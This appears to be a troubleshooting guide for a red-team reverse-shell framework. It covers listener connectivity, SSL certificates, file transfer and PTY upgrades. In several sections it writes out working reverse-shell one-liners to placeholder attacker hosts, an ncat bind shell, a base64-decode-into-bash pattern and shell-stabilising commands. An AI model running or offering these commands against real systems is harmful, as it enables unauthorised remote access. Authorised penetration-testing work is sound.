# 🔧 Troubleshooting Guide

Common issues and solutions for the Red Team Shell Framework.

---

## Table of Contents

1. [Installation Issues](#installation-issues)
2. [Connectivity Problems](#connectivity-problems)
3. [Encryption Issues](#encryption-issues)
4. [File Transfer Problems](#file-transfer-problems)
5. [Payload Issues](#payload-issues)
6. [PTY Upgrade Problems](#pty-upgrade-problems)
7. [Performance & Stability](#performance--stability)
8. [Advanced Debugging](#advanced-debugging)

---

## Installation Issues

### Issue: Cannot execute shellmaster.sh

**Symptom:**
```
bash: ./shellmaster.sh: Permission denied
```

**Solution:**
```bash
# Make script executable
chmod +x shellmaster.sh
chmod +x modules/*.sh

# Verify permissions
ls -l shellmaster.sh
# Should show: -rwxr-xr-x
```

---

### Issue: Modules directory not found

**Symptom:**
```
[ERROR] Cannot load modules: directory not found
```

**Solution:**
```bash
# Check directory exists
ls -la modules/

# If missing, create it
mkdir -p modules

# Verify all modules present
ls -la modules/
# Should list: listeners.sh, shells.sh, encrypt.sh, etc.
```

---

### Issue: config.sh or utils.sh not found

**Symptom:**
```
[ERROR] Cannot source configuration
```

**Solution:**
```bash
# Verify files exist
ls -la config.sh utils.sh

# Check they're in root directory
pwd
# Should output framework root directory

# Verify no path issues
file config.sh
# Should show: POSIX shell script
```

---

## Connectivity Problems

### Issue: Cannot connect to listener

**Symptom:**
```
Connection refused or timeout
```

**Solution:**

1. **Verify listener is running:**
   ```bash
   netstat -ln | grep LISTEN
   # Should show your port in LISTEN state
   
   # Or using ss
   ss -ln | grep LISTEN
   ```

2. **Check firewall:**
   ```bash
   # Linux - check iptables
   sudo iptables -L -n
   
   # Or ufw
   sudo ufw status
   
   # Windows - check firewall
   # Settings > Firewall > Allow an app through
   ```

3. **Verify correct port:**
   ```bash
   # Did you use correct port?
   nc -v localhost 4444
   # Should connect or show "refused"
   ```

4. **Check bind address:**
   ```bash
   # Is framework listening on all interfaces?
   netstat -ln | grep :4444
   # Should show 0.0.0.0:4444 or *:4444
   ```

---

### Issue: Reverse shell connection timeout

**Symptom:**
```
Waiting for connection... (times out after 60 seconds)
```

**Solution:**

1. **Verify IP address is correct:**
   ```bash
   # Check your IP
   ip addr show
   # or
   ifconfig
   
   # Verify payload has correct IP
   grep "192.168.1.100" payload.sh
   ```

2. **Check network connectivity:**
   ```bash
   # Ping target
   ping 192.168.1.100
   
   # Test port directly
   nc -v 192.168.1.100 4444
   ```

3. **Verify target can reach you:**
   ```bash
   # On target system
   ping [your_ip]
   
   # Try connecting manually
   bash -i >& /dev/tcp/[your_ip]/4444 0>&1
   ```

4. **Check for NAT/firewall:**
   ```bash
   # May need to use external IP
   # Use router IP if behind NAT
   ifconfig
   ```

---

### Issue: Connection drops immediately

**Symptom:**
```
[+] Connected from 192.168.1.100
[*] Connection lost
```

**Solution:**

1. **Check shell availability:**
   ```bash
   # Does target have bash?
   which bash
   which sh
   ```

2. **Verify shell execution:**
   ```bash
   # Try with explicit shell
   bash -i >& /dev/tcp/attacker_ip/4444 0>&1
   ```

3. **Check permissions:**
   ```bash
   # May need proper user permissions
   whoami
   id
   ```

4. **Enable error output:**
   ```bash
   bash -i >& /dev/tcp/attacker_ip/4444 0>&1 2>&1
   ```

---

## Encryption Issues

### Issue: SSL certificate not found

**Symptom:**
```
[ERROR] Certificate file not found: certs/cert.pem
```

**Solution:**

1. **Generate certificate:**
   ```bash
   ./shellmaster.sh
   > 3 (Encryption)
   > 1 (Generate certificate)
   
   # Or manually
   openssl req -new -x509 -days 365 -nodes \
     -out certs/cert.pem -keyout certs/key.pem
   ```

2. **Verify files:**
   ```bash
   ls -la certs/
   # Should show: cert.pem and key.pem
   ```

3. **Check permissions:**
   ```bash
   chmod 644 certs/cert.pem
   chmod 600 certs/key.pem
   ```

---

### Issue: socat: command not found

**Symptom:**
```
[ERROR] socat is not installed
```

**Solution:**

1. **Install socat:**
   ```bash
   # Ubuntu/Debian
   sudo apt-get install socat
   
   # CentOS/RHEL
   sudo yum install socat
   
   # macOS
   brew install socat
   ```

2. **Verify installation:**
   ```bash
   which socat
   socat --version
   ```

3. **Use alternative (ncat):**
   ```bash
   # If socat unavailable
   ncat --ssl -l 4444 -c /bin/bash
   ```

---

### Issue: SSL connection refused

**Symptom:**
```
[ERROR] SSL handshake failed
```

**Solution:**

1. **Test certificate:**
   ```bash
   openssl x509 -in certs/cert.pem -text -noout
   # Verify it's valid
   ```

2. **Connect with verbose output:**
   ```bash
   openssl s_client -connect localhost:4444 -cert certs/cert.pem
   ```

3. **Check certificate date:**
   ```bash
   # Ensure cert not expired
   openssl x509 -in certs/cert.pem -noout -dates
   ```

---

## File Transfer Problems

### Issue: SCP transfer fails

**Symptom:**
```
[ERROR] Permission denied (publickey)
```

**Solution:**

1. **Check SSH key:**
   ```bash
   # Verify SSH key exists
   ls -la ~/.ssh/
   
   # Check if key in authorized_keys
   cat ~/.ssh/authorized_keys
   ```

2. **Use password authentication:**
   ```bash
   scp -P 22 file.txt user@host:/tmp/
   # Will prompt for password
   ```

3. **Verify SSH working:**
   ```bash
   ssh user@host whoami
   # If this works, SCP should too
   ```

---

### Issue: Transfer timeout

**Symptom:**
```
scp: timeout during transfer
```

**Solution:**

1. **Check network:**
   ```bash
   ping -c 5 target_host
   # Check latency
   ```

2. **Increase timeout:**
   ```bash
   # Use verbose to see progress
   scp -v -P 22 largefile user@host:/tmp/
   ```

3. **Try direct path:**
   ```bash
   # May need full SSH key specification
   scp -i /path/to/key file user@host:/tmp/
   ```

---

### Issue: Checksum mismatch

**Symptom:**
```
[ERROR] Checksum mismatch!
Expected: abc123def456...
Got: xyz789uvw123...
```

**Solution:**

1. **Verify source file:**
   ```bash
   # Calculate hash on source
   sha256sum original_file.txt
   ```

2. **Verify destination:**
   ```bash
   # Calculate hash on destination
   sha256sum /tmp/received_file.txt
   ```

3. **Check file wasn't modified:**
   ```bash
   # Re-download file
   scp user@host:/path/to/file ./newcopy.txt
   sha256sum newcopy.txt
   ```

4. **Try again with fresh copy:**
   ```bash
   rm /tmp/received_file.txt
   scp user@host:/path/to/file /tmp/received_file.txt
   ```

---

## Payload Issues

### Issue: Payload not executing

**Symptom:**
```
[Command not found or no output]
```

**Solution:**

1. **Verify shell available:**
   ```bash
   which bash python python3 nc
   ```

2. **Check payload syntax:**
   ```bash
   # Test bash payload locally first
   bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
   ```

3. **Verify IP/port in payload:**
   ```bash
   grep "192.168" payload.txt
   # Ensure correct IP and port
   ```

4. **Try with explicit path:**
   ```bash
   /bin/bash -c "[payload]"
   # Or
   /usr/bin/python3 -c "[payload]"
   ```

---

### Issue: Base64 payload not decoding

**Symptom:**
```
bash: YmFz...: command not found
```

**Solution:**

1. **Verify encoding:**
   ```bash
   # Decode base64
   echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8x" | base64 -d
   # Should show readable command
   ```

2. **Use correct decode syntax:**
   ```bash
   # Linux
   echo "[base64]" | base64 -d | bash
   
   # macOS
   echo "[base64]" | base64 -D | bash
   
   # Windows (PowerShell)
   [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("[base64]")) | powershell -
   ```

3. **Verify no line breaks:**
   ```bash
   # Remove any newlines
   cat payload.txt | tr -d '\n' | base64 -d
   ```

---

## PTY Upgrade Problems

### Issue: PTY upgrade fails

**Symptom:**
```
[ERROR] Failed to upgrade to PTY
```

**Solution:**

1. **Verify Python available:**
   ```bash
   which python python3
   ```

2. **Try manual upgrade:**
   ```bash
   # In shell, run:
   python3 -c "import pty;pty.spawn('/bin/bash')"
   
   # Or:
   script /dev/null -c /bin/bash
   ```

3. **Check shell type:**
   ```bash
   echo $SHELL
   echo $0
   # May be using limited shell
   ```

4. **Try alternative methods:**
   ```bash
   # Method 1: socat
   socat exec:/bin/bash pty,raw,echo=0
   
   # Method 2: stty
   stty raw -echo
   ```

---

### Issue: Interactive shell not responding

**Symptom:**
```
[No response to commands]
```

**Solution:**

1. **Reset terminal:**
   ```bash
   # Press Ctrl+L to refresh
   # Or type 'reset' and press Enter
   reset
   ```

2. **Fix environment:**
   ```bash
   # Set correct terminal
   export TERM=xterm-256color
   export SHELL=/bin/bash
   export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
   ```

3. **Verify shell is active:**
   ```bash
   # Try simple command
   echo "test"
   ```

4. **Reconnect if needed:**
   ```bash
   # Close and start new listener
   # Create new reverse shell
   ```

---

## Performance & Stability

### Issue: Framework runs slowly

**Solution:**

1. **Check system resources:**
   ```bash
   # Check CPU/Memory
   top
   # or
   htop
   ```

2. **Disable logging temporarily:**
   ```bash
   # In config.sh
   export LOG_LEVEL="OFF"
   ```

3. **Reduce verbosity:**
   ```bash
   # In shellmaster.sh
   export DEBUG=0
   ```

---

### Issue: Listener crashes after few connections

**Solution:**

1. **Check for resource leaks:**
   ```bash
   # Monitor connections
   watch -n 1 'netstat -an | grep ESTABLISHED'
   ```

2. **Increase system limits:**
   ```bash
   # Check limits
   ulimit -a
   
   # Increase file descriptors
   ulimit -n 65536
   ```

3. **Review logs:**
   ```bash
   tail -f logs/framework.log
   ```

---

## Advanced Debugging

### Enable Debug Mode

```bash
# Set debug flag
export DEBUG=1
export LOG_LEVEL="DEBUG"

# Run framework
./shellmaster.sh

# Check verbose output
tail -f logs/framework.log
```

---

### Check Module Loading

```bash
# Verify modules load correctly
bash -x shellmaster.sh

# Will show each command executed
```

---

### Network Packet Capture

```bash
# Capture traffic on port 4444
sudo tcpdump -i eth0 -n port 4444

# With packet content
sudo tcpdump -i eth0 -A port 4444
```

---

### System Call Tracing

```bash
# Trace framework execution
strace ./shellmaster.sh

# With output to file
strace -o trace.log ./shellmaster.sh
```

---

## Getting Help

1. **Check logs:**
   ```bash
   cat logs/framework.log | grep ERROR
   ```

2. **Enable debug mode:**
   ```bash
   export DEBUG=1
   ./shellmaster.sh
   ```

3. **Review documentation:**
   ```bash
   cat docs/ARCHITECTURE.md
   cat docs/API.md
   ```

4. **Test components individually:**
   ```bash
   source modules/listeners.sh
   # Test specific functions
   ```

---

## Common Error Messages

| Error | Cause | Solution |
|-------|-------|----------|
| `Permission denied` | Missing execute permission | `chmod +x script.sh` |
| `Command not found` | Missing dependency or wrong path | Install dependency or check PATH |
| `Address already in use` | Port already in use | Use different port or kill existing process |
| `Connection refused` | Listener not running | Start listener first |
| `SSL error` | Certificate issue | Regenerate certificate |
| `Timeout` | Network/firewall issue | Check connectivity and firewall |

---

**Still having issues? Review the complete documentation in the `docs/` directory.**

---
